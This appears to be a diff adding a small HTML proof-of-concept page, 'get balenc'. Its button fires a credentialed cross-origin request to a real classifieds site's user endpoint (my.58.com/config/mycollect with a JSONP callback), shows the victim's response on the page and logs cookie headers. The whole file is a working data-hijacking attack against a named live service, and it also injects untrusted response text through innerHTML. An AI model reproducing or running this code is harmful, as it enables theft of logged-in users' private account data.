@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<body>
+<div id="demo">
+<h1> get balenc </h1>
+<button type="button" onclick="loadDoc()">click me</button>
+
+</div>
+<script>
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML =
+      this.responseText;
+       console.log(this.getResponseHeader('set-cookie'));
+    }
+  };
+  xhttp.withCredentials=true;
+  xhttp.open("GET","https://my.58.com/config/mycollect?callback=JSONP_1646376559898",true)
+  xhttp.send();
+}
+</script>
+</body>
+</html>
